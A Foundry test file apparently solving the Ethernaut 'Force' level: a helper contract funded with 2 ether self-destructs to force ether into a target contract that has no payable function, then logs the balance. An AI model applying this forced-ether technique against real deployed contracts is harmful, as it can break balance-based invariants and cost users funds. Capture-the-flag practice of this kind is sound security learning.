// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Force} from "../Level7/Force.sol";

contract MockContract {
    address _target;

    constructor(address target_) {
        _target = target_;
    }

    function attack() public {
        selfdestruct(payable(_target));
    }
}

contract ForceTest is Test {
    Force public forceContract;
    MockContract public mockContract;

    function setUp() public {
        forceContract = new Force();
        mockContract = new MockContract(address(forceContract));
    }

    function test_forceDeployed() public view {
        assertNotEq(address(forceContract), address(0));
    }

    function test_forceAttack() public {
        vm.deal(address(mockContract), 2 ether);
        mockContract.attack();

        console.log(address(forceContract).balance);
    }

    // function testFuzz_force(uint256 x) public {

    //     (bool success ,) = address(forceContract).call{value: x}("");
    //     if(!success) revert();
    // }
}
